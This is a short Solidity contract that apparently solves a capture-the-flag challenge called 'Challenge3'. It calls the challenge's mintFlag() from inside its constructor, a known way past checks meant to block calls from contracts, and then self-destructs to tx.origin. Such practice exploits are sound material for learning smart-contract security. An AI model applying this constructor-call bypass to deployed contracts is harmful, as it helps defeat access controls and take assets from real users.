//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge3 {
    function mintFlag() external;
}

contract Challenge3Solution {
    address public challenge3;
    constructor(address _challenge3) {
        IChallenge3(_challenge3).mintFlag();
        selfdestruct(payable(tx.origin)); 
    }
}